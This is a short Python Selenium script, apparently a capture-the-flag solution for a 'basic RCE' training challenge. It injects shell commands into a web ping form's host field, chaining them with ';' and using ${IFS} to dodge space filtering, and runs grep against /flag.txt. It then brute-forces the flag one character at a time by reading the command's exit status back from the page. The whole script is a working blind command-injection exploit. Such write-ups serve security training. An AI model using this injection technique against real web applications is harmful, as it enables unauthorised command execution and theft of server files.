import os
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import string
import pickle

#alfabeto = string.printable[0:94];
#alfabeto = string.printable[0:94];
alfabeto = "0134cfgilmnostCIPT$^_{}"#HO TOLTO IL PUNTO .

out = [];

chromedriver = "/usr/local/bin/chromedriver"
os.environ["webdriver.chrome.driver"] = chromedriver
driver = webdriver.Chrome(chromedriver)
driver.get("http://basicrce.challs.cyberchallenge.it/")
txt = driver.find_element_by_id("textarea")
txt.send_keys("www.google.com;grep${IFS}${IFS}'a'${IFS}/flag.txt&&ls")
driver.execute_script("ping()")
c='a'

for lettera in alfabeto:
	c_ = c
	c = lettera
	txt.clear();
	txt.send_keys("www.google.com;grep${IFS}${IFS}'^CCIT{P1n"+c+"'${IFS}/flag.txt&&ls")
	status = driver.find_element_by_id("status").text[13]
	driver.execute_script("ping()")
	out.append([c_, int(status)])

for d in out:
	if(d[1] == 0):
		new = d[0]
		print(new)